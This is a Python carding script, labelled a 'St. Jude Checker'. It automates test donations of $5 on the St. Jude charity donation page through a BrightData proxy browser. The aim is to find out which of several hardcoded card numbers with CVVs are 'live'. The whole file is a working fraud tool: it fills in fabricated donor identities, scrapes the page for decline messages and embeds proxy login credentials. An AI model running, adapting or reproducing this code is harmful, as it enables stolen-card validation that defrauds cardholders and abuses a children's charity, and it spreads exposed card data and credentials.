#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
St. Jude Checker — v15 (Fast + Mass)
"""

import re
import os
import time
import random
from playwright.sync_api import sync_playwright


# ═══════════════════════════════════════════════════════════
# CONFIG
# ═══════════════════════════════════════════════════════════

CARDS = [
    "5143772873843560|02|30|945",
    "4147202548364411|06|27|288",
    "4828210009461358|10|29|840",
    "5488093703717434|11|2028|076",
    "5555422029770025|08|2030|805",
]

BD_USER = "brd-customer-hl_24c8058e-zone-scraping_browser1"
BD_PASS = "eyr0v46j28pi"
BD_HOST = "brd.superproxy.io"
BD_PORT = "9222"

DONATE_URL = "https://www.stjude.org/donate/donate-to-st-jude.html"

FIRST_NAMES = ["James", "John", "Robert", "Michael", "William", "David"]
LAST_NAMES = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia"]

ADDRESSES = [
    {"a1": "1600 Amphitheatre Pkwy", "c": "Mountain View", "s": "CA", "z": "94043"},
    {"a1": "350 Fifth Avenue", "c": "New York", "s": "NY", "z": "10118"},
    {"a1": "233 S Wacker Dr", "c": "Chicago", "s": "IL", "z": "60606"},
]


# ═══════════════════════════════════════════════════════════
# HELPERS
# ═══════════════════════════════════════════════════════════

def make_email(f, l):
    return f"{f.lower()}{l.lower()}{random.randint(100,999)}@gmail.com"


# ═══════════════════════════════════════════════════════════
# MAIN CHECK
# ═══════════════════════════════════════════════════════════

def check_card(browser, card, idx, total):
    t0 = time.time()
    result = "UNKNOWN"
    
    try:
        parts = card.strip().split("|")
        if len(parts) < 4:
            return ("INVALID_FORMAT", 0)
        
        num, mm, yy, cvv = parts[0], parts[1].zfill(2), parts[2], parts[3]
        if len(yy) == 2:
            yy = "20" + yy
        
        print(f"\n{'='*60}", flush=True)
        print(f"🔍 [{idx}/{total}] {num[:6]}****{num[-4:]}", flush=True)
        print(f"{'='*60}", flush=True)
        
        # ═══ جلسة جديدة لكل كارت ═══
        context = browser.new_context()
        page = context.new_page()
        
        # ═══ فتح الصفحة ═══
        print("📄 Loading...", flush=True)
        page.goto(DONATE_URL, timeout=60000, wait_until="domcontentloaded")
        time.sleep(3)
        
        # ═══ Other Payment Options ═══
        try:
            page.wait_for_selector("#continue-to-other-payment", timeout=20000, state="visible")
            page.click("#continue-to-other-payment")
            print("👆 Other Payment", flush=True)
            time.sleep(2)
        except:
            pass
        
        # ═══ Credit Card ═══
        try:
            page.wait_for_selector("#cc-link", timeout=20000, state="visible")
            page.click("#cc-link")
            print("👆 Credit Card", flush=True)
            time.sleep(2)
        except:
            pass
        
        # ═══ انتظار الفورم ═══
        try:
            page.wait_for_selector("#cardNumber", timeout=20000, state="visible")
            print("✅ Form ready", flush=True)
        except:
            context.close()
            return ("NO_FORM", round(time.time() - t0, 1))
        
        # ═══ ملء البيانات ═══
        f = random.choice(FIRST_NAMES)
        l = random.choice(LAST_NAMES)
        em = make_email(f, l)
        ad = random.choice(ADDRESSES)
        ph = f"{random.randint(200,999)}{random.randint(200,999)}{random.randint(1000,9999)}"
        
        print("📝 Filling...", flush=True)
        
        # Card
        page.fill("#cardNumber", num)
        page.fill("#expMonth", mm)
        page.fill("#expYear", yy[2:] if len(yy) == 4 else yy)
        page.fill("#cardCvv2", cvv)
        
        # Amount
        try:
            page.fill("#donationAmountOther", "5")
        except:
            pass
        
        # Personal
        page.fill("#firstName", f)
        page.fill("#lastName", l)
        page.fill("#email", em)
        page.fill("#address1", ad["a1"])
        page.fill("#city", ad["c"])
        
        try:
            page.select_option("#stateProvince", ad["s"])
        except:
            pass
        
        page.fill("#zipPostalCode", ad["z"])
        
        try:
            page.fill("#phoneNumber", ph)
        except:
            pass
        
        print("✅ Form filled", flush=True)
        time.sleep(0.3)
        
        # ═══ Click Donate ═══
        print("👆 Donate...", flush=True)
        try:
            page.click("#donateButton")
        except:
            pass
        
        # ═══ انتظر الرد ═══
        print("⏳ Waiting response...", flush=True)
        
        response = None
        for i in range(25):
            time.sleep(1)
            try:
                page_text = page.inner_text("body")
                text_lower = page_text.lower()
                
                patterns = [
                    r"there are insufficient funds[^.]*\.",
                    r"insufficient funds[^.]*\.",
                    r"your card was declined[^.]*\.",
                    r"card was declined[^.]*\.",
                    r"card has expired[^.]*\.",
                    r"security code is invalid[^.]*\.",
                    r"card number is invalid[^.]*\.",
                    r"do not honor[^.]*\.",
                    r"restricted card[^.]*\.",
                    r"suspected fraud[^.]*\.",
                    r"thank you for your donation[^.]*\.",
                    r"your donation was successful[^.]*\.",
                    r"we are sorry[^.]*\.",
                ]
                
                for pat in patterns:
                    m = re.search(pat, text_lower)
                    if m:
                        response = m.group(0).strip()
                        break
                
                if response:
                    break
            except:
                pass
        
        context.close()
        
        if response:
            result = response[:200]
        else:
            result = "NO_RESPONSE"
    
    except Exception as e:
        result = f"ERR: {str(e)[:100]}"
        print(f"❌ {str(e)[:150]}", flush=True)
    
    elapsed = round(time.time() - t0, 1)
    
    print(f"📝 {result}", flush=True)
    print(f"⏱️ {elapsed}s", flush=True)
    
    return (result, elapsed)


# ═══════════════════════════════════════════════════════════
# MAIN
# ═══════════════════════════════════════════════════════════

def main():
    print("=" * 60, flush=True)
    print("  St. Jude — v15 (Fast + Mass)", flush=True)
    print("=" * 60, flush=True)
    print(f"📁 Cards: {len(CARDS)}", flush=True)
    print("=" * 60, flush=True)
    
    results = []
    t_start = time.time()
    
    with sync_playwright() as p:
        # ═══ اتصال BrightData مرة واحدة ═══
        cdp_url = f"wss://{BD_USER}:{BD_PASS}@{BD_HOST}:{BD_PORT}"
        
        print("🌐 Connecting to BrightData...", flush=True)
        browser = p.chromium.connect_over_cdp(cdp_url, timeout=120000)
        print("✅ Connected", flush=True)
        
        # ═══ فحص كل كارت ═══
        for idx, card in enumerate(CARDS, 1):
            result, elapsed = check_card(browser, card, idx, len(CARDS))
            results.append({
                'card': card,
                'result': result,
                'elapsed': elapsed,
            })
        
        browser.close()
    
    total_time = round(time.time() - t_start, 1)
    
    # ═══ النتائج النهائية ═══
    print("\n" + "=" * 60, flush=True)
    print("📊 FINAL RESULTS", flush=True)
    print("=" * 60, flush=True)
    
    for r in results:
        print(f"💳 {r['card']}", flush=True)
        print(f"   📝 {r['result']}", flush=True)
        print(f"   ⏱️ {r['elapsed']}s", flush=True)
        print("-" * 60, flush=True)
    
    print(f"\n⏱️ Total: {total_time}s ({round(total_time/60, 1)} min)", flush=True)
    print("=" * 60, flush=True)
    
    # ═══ ملخص ═══
    live = sum(1 for r in results if 'insufficient' in r['result'].lower() or 'declined' in r['result'].lower())
    dead = len(results) - live
    
    print(f"\n✅ Live: {live}", flush=True)
    print(f"❌ Dead: {dead}", flush=True)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n🛑 Stopped", flush=True)
    except Exception as e:
        print(f"\n❌ Error: {str(e)[:200]}", flush=True)
